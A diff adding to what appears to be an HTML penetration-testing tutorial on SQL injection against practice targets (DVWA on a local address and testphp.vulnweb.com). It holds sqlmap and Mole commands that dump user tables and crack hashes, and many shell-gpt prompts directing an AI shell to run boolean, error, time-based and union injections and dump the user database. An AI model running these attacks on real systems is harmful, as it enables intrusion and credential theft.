@@ -73,3 +73,44 @@ will automatically utilize Burp Suite as the proxy, allowing for seamless intera
  <ul><i>sqlmap -u '<b>http://192.168.1.69/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#</b>' --cookie="<b>security=low; PHPSESSID=8312ad2df71eea9d627563b4710140d0</b>" --dump -D dvwa -T users --batch</i></ul>
 </ol></p>
 <p>SQLMap will retrieve the entries from the "user" and "password" columns. It will crack the hashes using a dictionary attack and outputs the plaintext passwords.</p>
+
+<h1>Other tools and techniques</h1>
+<h2>Mole</h2>
+<p><a target=_blank href="https://sourceforge.net/projects/themole/">Mole</a> is an automatic SQL injection exploitation tool. Only by providing a vulnerable URL and a valid string on the site, it can detect the injection and exploit it using the <b>Union</b> technique or a 
+<b>Boolean</b> query-based technique. Mole uses a command-based interface, allowing the user to indicate the action he/she wants to perform easily. The CLI also provides auto-completion for both commands and command 
+arguments, minimizing the user's need to type. The mole has to be <a target=_blank href=https://samiux.blogspot.com/2014/06/howto-mole-on-kali-linux-107.html>installed</a> on kali.</p>
+<p><ol>
+  <ul>themole -h</ul>
+  <ul>themole -u "http://192.168.1.69/dvwa/vulnerabilities/sqli_blind/?id=2" -n "admin"</ul>
+</ol></p>
+<h2>AI</h2>
+<p>SQL injections can be performed effortlessly with the aid of AI.</p>
+<p><ol>
+  <ul>sgpt --shell "check for all possible SQL injection on target url http://testphp.vulnweb.com"</ul>
+  <ul>sgpt --shell "check for boolean based sql injection on target url http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate the database"</ul>
+  <ul>sgpt --shell "check for boolean based sql injection on target url http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate the tables in acuart database"</ul>
+  <ul>sgpt --shell "check for boolean based sql injection on target url http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate users table in acuart database"</ul>
+  <ul>sgpt --shell "check for boolean based sql injection on target url http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate users table in acuart database and dump the user database"</ul>
+</ol></p>
+<p>Same goes for Error-based SQL Injection</p>
+<p><ol>
+  <ul>sgpt --shell "perform error based sql injection on target url http://testphp.vulnweb.com/listproducts.php?cat=1 and if vulnerable enumerate the database"</ul>
+  <ul>sgpt --shell "perform error based sql injection on target url http://testphp.vulnweb.com/listproducts.php?cat=1 and if vulnerable enumerate the tables in acuart database"</ul>
+  <ul>sgpt --shell "perform error based sql injection on target url http://testphp.vulnweb.com/listproducts.php?cat=1 and if vulnerble enumerate users table in acuart database"</ul>
+  <ul>sgpt --shell "perform error based sql injection on target url http://testphp.vulnweb.com/listproducts.php?cat=1 and if vulnerable enumerate users table in acuart database and dump the user database"</ul>
+</ol></p>
+<p>Time-based SQL Injection</p>
+<p><ol>
+  <ul>sgpt --shell "perform time-based blind sql injection on target url http://testphp.vulnweb.com/listproducts.php?cat=1 and if vulnerable enumerate the database"</ul>
+  <ul>sgpt --shell "perform time-based blind sql injection on target url http://testphp.vulnweb.com/listproducts.php?cat=1 and if vulnerable enumerate the tables in acuart database"</ul>
+  <ul>sgpt --shell "perform time-based blind sql injection on target url http://testphp.vulnweb.com/listproducts.php?cat=1 and if vulnerble enumerate users table in acuart database"</ul>
+  <ul>sgpt --shell "perform time-based blind sql injection on target url http://testphp.vulnweb.com/listproducts.php?cat=1 and if vulnerable enumerate users table in acuart database and dump the user database"</ul>
+</ol></p>
+<p>Union based SQL Injection</p>
+<p><ol>
+  <ul>sgpt --shell "perform union-based sql injection on target url http://testphp.vulnweb.com/listproducts.php?cat=1 and if vulnerable enumerate the database"</ul>
+  <ul>sgpt --shell "perform union-based sql injection on target url http://testphp.vulnweb.com/listproducts.php?cat=1 and if vulnerable enumerate the tables in acuart database"</ul>
+  <ul>sgpt --shell "perform union-based sql injection on target url http://testphp.vulnweb.com/listproducts.php?cat=1 and if vulnerble enumerate users table in acuart database"</ul>
+  <ul>sgpt --shell "perform union-based sql injection on target url http://testphp.vulnweb.com/listproducts.php?cat=1 and if vulnerable enumerate users table in acuart database and dump the user database"</ul>
+</ol></p>
+<p>We can see that with AI we have a lot of opportunities and it's not hard to do</p>
